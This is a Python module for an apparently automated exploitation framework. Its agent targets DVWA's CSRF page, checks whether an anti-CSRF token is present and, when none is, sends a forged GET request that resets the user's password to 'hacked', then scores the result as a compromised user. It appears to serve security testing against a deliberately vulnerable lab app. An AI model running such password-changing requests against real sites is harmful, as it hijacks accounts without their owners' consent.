"""Tier 2 CSRF agent."""

from __future__ import annotations

from typing import Any

from agents.base_agent import BaseAgent
from agents.state_utils import (
    already_tried_payloads,
    append_error_marker,
    make_update,
    module_endpoint,
    normalize_security_level,
    prepare_agent_session,
)
from core.state import ExploitationState
from foundation.http_client import RequestTimeoutError, TransportError
from foundation.payload_library import PayloadLibrary
from foundation.session_manager import DVWASession


class CSRFAgent(BaseAgent):
    module_name = "csrf"

    def __init__(self) -> None:
        self.payloads = PayloadLibrary()

    def check_prerequisites(self, state: ExploitationState) -> bool:
        return True

    def run(self, state: ExploitationState) -> dict[str, Any]:
        target_url = state.get("target_url", "")
        level = normalize_security_level(state.get("security_level"))
        endpoint = module_endpoint(state, self.module_name, "/vulnerabilities/csrf/")
        payload_set = self.payloads.get(self.module_name, level)
        already_tried = already_tried_payloads(state, self.module_name)

        score = 0
        confirmed: list[str] = []
        outcomes: list[str] = []
        tried_now: list[str] = []

        if not target_url:
            return make_update(
                state=state,
                module_name=self.module_name,
                score=score,
                tried_payloads=tried_now,
            )

        session = DVWASession(target_url)
        try:
            ready, prep_notes = prepare_agent_session(session, level, require_login=True)
            tried_now.extend(prep_notes)
            if not ready:
                return make_update(
                    state=state,
                    module_name=self.module_name,
                    score=score,
                    tried_payloads=tried_now,
                )

            page = session.get(endpoint)
            body = page.text or ""
            token_present = "user_token" in body

            probe = payload_set.probe[0] if payload_set.probe else "password_new=hacked"
            if probe not in already_tried:
                tried_now.append(probe)

            if not token_present:
                if "direct_get_change" not in already_tried:
                    result = session.get(
                        endpoint,
                        params={
                            "password_new": "hacked",
                            "password_conf": "hacked",
                            "Change": "Change",
                        },
                    )
                    tried_now.append("direct_get_change")
                    result_body = (result.text or "").lower()
                    if "password changed" in result_body:
                        score = 3
                        confirmed = ["csrf_confirmed", "user_compromised"]
                        outcomes = ["user_compromised"]
                    else:
                        score = max(score, 1)
            else:
                score = 2
        except (TransportError, RequestTimeoutError, RuntimeError, ValueError) as exc:
            append_error_marker(tried_now, "csrf_runtime_error", exc)
        finally:
            session.close()

        return make_update(
            state=state,
            module_name=self.module_name,
            score=score,
            tried_payloads=tried_now,
            confirmed_vulns=confirmed,
            achieved_outcomes=outcomes,
        )


_AGENT = CSRFAgent()


def csrf_agent(state: ExploitationState) -> dict[str, Any]:
    return _AGENT.run(state)
